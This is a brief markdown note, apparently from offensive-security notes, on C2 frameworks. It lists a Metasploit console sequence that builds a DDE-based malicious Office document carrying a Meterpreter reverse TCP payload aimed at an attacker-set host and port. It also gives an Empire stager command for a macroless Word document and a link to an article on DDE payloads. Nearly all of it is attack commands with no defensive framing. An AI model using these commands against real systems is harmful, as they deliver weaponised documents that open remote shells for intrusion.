# C2 Frameworks

## 01 - Metasploit

TODO: Fill this info

```
msf > use exploit/windows/fileformat/office_dde_delivery

msf exploit(windows/fileformat/office_dde_delivery) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/fileformat/office_dde_delivery) > options

msf exploit(windows/fileformat/office_dde_delivery) > set lhost <IP>

msf exploit(windows/fileformat/office_dde_delivery) > set lport <PORT>

msf exploit(windows/fileformat/office_dde_delivery) > run
```

## 02 - Empire

```
usestager windows/macroless_msword
```

---
## References

- [Panagiotis Gkatziroulis: DDE Payloads](https://medium.com/red-team/dde-payloads-16629f4a2fcd)